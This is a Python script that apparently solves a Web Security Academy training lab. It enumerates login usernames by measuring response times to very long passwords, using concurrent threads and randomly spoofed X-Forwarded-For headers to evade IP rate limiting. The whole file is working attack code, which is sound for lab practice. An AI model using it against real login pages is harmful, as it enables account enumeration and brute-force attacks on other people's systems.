import requests
import urllib3
import urllib.parse
import concurrent.futures
import threading
import time
import random

# Suppress the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_host = '0a17004b03d24f7381c311440000001e'
cookies = dict()
cookies['session'] = 'Tt8MWbdBU94gjDumq7UVlSoPQlBUUr7W'
domain = 'web-security-academy.net'
url = f'https://{target_host}.{domain}/login'
username_file = "../candidate_usernames.txt"
password_file = "../candidate_passwords.txt"

num_workers = 20

headers = {
    'Host': f'{target_host}.{domain}',
    'Content-Length': '33',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': f'https://{target_host}.{domain}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': f'{url}/login',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

results = []

def login_func(username:str):
    k = 1
    password = 'A' * 1000

    s, i, j = random.randint(1, 255), random.randint(0, 255), random.randint(0, 255)
    headers['X-Forwarded-For'] = f'{s}.{i}.{j}.{k}' 

    cred = {
        'username': username.strip(),
        'password': password
    }

    payload = urllib.parse.urlencode(cred).encode('utf-8')
    headers['Content-Length'] = str(len(payload))

    tic = time.time()
    response = requests.post(url, headers=headers, cookies=cookies, data=cred, verify=False)
    toc = time.time()

    result = {username.strip(): toc - tic}
    print(result)
    return result

def try_username():
    usernames = []

    with open(username_file, 'r') as f:
        usernames = f.readlines()

    # Using ThreadPoolExecutor for concurrency
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        results.extend(executor.map(login_func, usernames))

tic0 = time.time()
try_username()

# Sort by the time consumed for each login
sorted_result = sorted(results, key=lambda x: list(x.values())[0], reverse=True)


print(f"\n\n{'#'*75}\nFinal result:\n{'#'*75}\n")
print(sorted_result)

toc0 = time.time()
print(f"Time consumed: {toc0-tic0:.1f}s")
